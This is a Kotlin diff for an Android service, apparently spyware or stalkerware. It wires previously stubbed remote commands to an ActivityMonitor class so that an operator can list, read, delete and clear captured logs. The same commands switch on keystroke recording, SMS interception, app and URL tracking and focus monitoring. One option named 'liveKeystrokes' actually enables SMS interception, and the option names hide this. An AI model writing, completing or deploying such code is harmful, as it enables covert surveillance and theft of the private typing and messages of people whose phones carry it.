@@ -1,6 +1,7 @@
 package com.storm.safe.rock.service.modules.command
 
 import android.util.Log
+import com.storm.safe.rock.service.modules.ActivityMonitor
 import org.json.JSONObject
 
 /**
@@ -56,80 +57,83 @@ class LogCommandHandler : CommandHandler {
 
         when (command) {
             "GET_LOG_LIST" -> {
-                val type = params?.optString("type", "KSTR") ?: "KSTR"
-                // vendor: calls ActivityMonitor.listLogFiles(logType)
-                // Wire: val files = ActivityMonitor.listLogFiles(logType) → JSONArray
+                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
+                val type = ActivityMonitor.parseLogType(typeStr)
+                val files = ActivityMonitor.listLogFiles(type)
                 result.put("success", true)
-                result.put("type", type)
-                result.put("files", org.json.JSONArray())  // vendor: wired to ActivityMonitor
-                Log.d(TAG, "获取日志列表: type=$type")
+                result.put("type", typeStr)
+                result.put("files", files)
+                Log.d(TAG, "获取日志列表: type=$typeStr, files=$files")
             }
             "GET_ALL_LOG_LISTS" -> {
-                // vendor: iterates all LogType values
+                val lists = JSONObject()
+                for (logType in ActivityMonitor.LogType.values()) {
+                    lists.put(logType.name, ActivityMonitor.listLogFiles(logType))
+                }
                 result.put("success", true)
-                result.put("lists", JSONObject())
+                result.put("lists", lists)
                 Log.d(TAG, "获取所有日志列表")
             }
             "READ_LOG" -> {
-                val type = params?.optString("type", "KSTR") ?: "KSTR"
+                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
                 val filename = params?.optString("filename", "") ?: ""
-
                 if (filename.isEmpty()) {
                     result.put("success", false)
                     result.put("error", "filename is required")
                     return result
                 }
-
-                // vendor: reads from /sdcard/IC/<type>/<filename>.txt
+                val type = ActivityMonitor.parseLogType(typeStr)
+                val content = ActivityMonitor.readLogFile(type, filename)
                 result.put("success", true)
-                result.put("type", type)
+                result.put("type", typeStr)
                 result.put("filename", filename)
-                result.put("content", "")
-                Log.d(TAG, "读取日志: type=$type, filename=$filename")
+                result.put("content", content)
+                Log.d(TAG, "读取日志: type=$typeStr, filename=$filename, size=${content.length}")
             }
             "DELETE_LOG" -> {
-                val type = params?.optString("type", "KSTR") ?: "KSTR"
+                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
                 val filename = params?.optString("filename", "") ?: ""
-
                 if (filename.isEmpty()) {
                     result.put("success", false)
                     result.put("error", "filename is required")
                     return result
                 }
-
-                // vendor: deletes file from /sdcard/IC/<type>/
-                result.put("success", true)
-                result.put("type", type)
+                val type = ActivityMonitor.parseLogType(typeStr)
+                val deleted = ActivityMonitor.deleteLogFile(type, filename)
+                result.put("success", deleted)
+                result.put("type", typeStr)
                 result.put("filename", filename)
-                Log.d(TAG, "删除日志: type=$type, filename=$filename")
+                Log.d(TAG, "删除日志: type=$typeStr, filename=$filename, result=$deleted")
             }
             "CLEAR_LOGS" -> {
-                val type = params?.optString("type", "KSTR") ?: "KSTR"
-                result.put("success", true)
-                result.put("type", type)
-                Log.d(TAG, "清空日志: type=$type")
+                val typeStr = params?.optString("type", "KSTR") ?: "KSTR"
+                val type = ActivityMonitor.parseLogType(typeStr)
+                val cleared = ActivityMonitor.clearLogs(type)
+                result.put("success", cleared)
+                result.put("type", typeStr)
+                Log.d(TAG, "清空日志: type=$typeStr, result=$cleared")
             }
             "CLEAR_ALL_LOGS" -> {
-                result.put("success", true)
-                Log.d(TAG, "清空所有日志")
+                val cleared = ActivityMonitor.clearAllLogs()
+                result.put("success", cleared)
+                Log.d(TAG, "清空所有日志: result=$cleared")
             }
             "SET_LOG_OPTIONS" -> {
-                // vendor: sets static fields on ActivityMonitor
                 if (params != null) {
                     if (params.has("recKeystrokes")) {
-                        Log.d(TAG, "Set recKeystrokes=${params.optBoolean("recKeystrokes", true)}")
+                        ActivityMonitor.textMonitorEnabled = params.optBoolean("recKeystrokes", true)
                     }
                     if (params.has("liveKeystrokes")) {
-                        Log.d(TAG, "Set liveKeystrokes=${params.optBoolean("liveKeystrokes", false)}")
+                        ActivityMonitor.smsInterceptActive = params.optBoolean("liveKeystrokes", false)
                     }
                     if (params.has("recApps")) {
-                        Log.d(TAG, "Set recApps=${params.optBoolean("recApps", true)}")
+                        ActivityMonitor.appUsageEnabled = params.optBoolean("recApps", true)
                     }
                     if (params.has("recLinks")) {
-                        Log.d(TAG, "Set recLinks=${params.optBoolean("recLinks", true)}")
+                        ActivityMonitor.urlMonitorEnabled = params.optBoolean("recLinks", true)
                     }
                     if (params.has("recNotifications")) {
-                        Log.d(TAG, "Set recNotifications=${params.optBoolean("recNotifications", true)}")
+                        ActivityMonitor.focusMonitorEnabled = params.optBoolean("recNotifications", true)
                     }
                 }
                 result.put("success", true)
@@ -156,12 +160,11 @@ class LogCommandHandler : CommandHandler {
      */
     private fun getLogOptions(): JSONObject {
         return JSONObject().apply {
-            // vendor: reads from ActivityMonitor static fields
-            put("recKeystrokes", true)
-            put("liveKeystrokes", false)
-            put("recApps", true)
-            put("recLinks", true)
-            put("recNotifications", true)
+            put("recKeystrokes", ActivityMonitor.textMonitorEnabled)
+            put("liveKeystrokes", ActivityMonitor.smsInterceptActive)
+            put("recApps", ActivityMonitor.appUsageEnabled)
+            put("recLinks", ActivityMonitor.urlMonitorEnabled)
+            put("recNotifications", ActivityMonitor.focusMonitorEnabled)
         }
     }
 }
